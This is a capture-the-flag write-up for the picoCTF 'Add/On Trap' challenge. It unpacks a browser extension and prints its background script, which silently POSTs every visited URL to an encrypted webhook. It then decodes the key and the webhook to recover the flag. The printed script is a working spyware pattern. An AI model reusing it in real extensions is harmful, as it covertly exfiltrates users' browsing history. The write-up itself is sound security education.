# PicoCTF-Challenge: The Add/On Trap

## Description:
Author: Alessandro Greco aka Aleff

Description
What kind of information can an Add/On reach? Is it possible to exfiltrate them without me noticing? Do they really do what they say? Most importantly, when to eat? These and many other questions Add/On users should be asking themselves.
Download the provided browser extension and inspect it to uncover the hidden flag:
Download the .xpi, password picoctf

### Hints:
1.What kind of file is one ending in .xpi?
2.Which modern Python scheme uses url-safe Base64 32-byte keys?

## Walkthrough
```python
file 56102ec0438646c68605-1.0.xpi
56102ec0438646c68605-1.0.xpi: Zip archive data, made by v2.0, extract using at least v2.0, last modified ? 00 1980 00:00:00, uncompressed size 703, method=deflate
```

```python
unzip 56102ec0438646c68605-1.0.xpi
Archive:  56102ec0438646c68605-1.0.xpi
  inflating: manifest.json
  inflating: popup.html
  inflating: icons/icon-64.png
  inflating: icons/icon-32.png
  inflating: assets/styles.css
  inflating: assets/script.js
  inflating: background/main.js
  inflating: META-INF/cose.manifest
  inflating: META-INF/cose.sig
  inflating: META-INF/manifest.mf
  inflating: META-INF/mozilla.sf
  inflating: META-INF/mozilla.rsa
```

```python
cat main.js
// Secret key must be 32 url-safe base64-encoded bytes!
// TODO I must find a solution to remove the key from here, for now I'll leave it there because I need it to encrypt the webhook

function logOnCompleted(details) {
    console.log(`Information to exfiltrate: ${details.url}`);
    const key="cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0="
    const webhookUrl='gAAAAABmfRjwFKUB-X3GBBqaN1tZYcPg5oLJVJ5XQHFogEgcRSxSis1e4qwicAKohmjqaD-QG8DIN5ie3uijCVAe3xiYmoEHlxATWUP3DC97R00Cgkw4f3HZKsP5xHewOqVPH8ap9FbE'
    const payload = {
        content: `${details.url}`
    };
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.status != 204) {
            throw `Unable to complete the extraction!`;
        }
        return response;
    });
}

browser.webNavigation.onCompleted.addListener(logOnCompleted);
```

```
Load that Base64 encoding to the CyberChef and got this
cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0=   -->   picoCTF{you're on the right tra}
```

```
Came to know that the Encrytpion type is Fernet Decrypt and the Key is that base64 encoding
"gAAAAABmfRjwFKUB-X3GBBqaN1tZYcPg5oLJVJ5XQHFogEgcRSxSis1e4qwicAKohmjqaD-QG8DIN5ie3uijCVAe3xiYmoEHlxATWUP3DC97R00Cgkw4f3HZKsP5xHewOqVPH8ap9FbE"
```

Final Flag:
picoCTF{Us3_4dd/0ns_v3ry_c4r3fully1}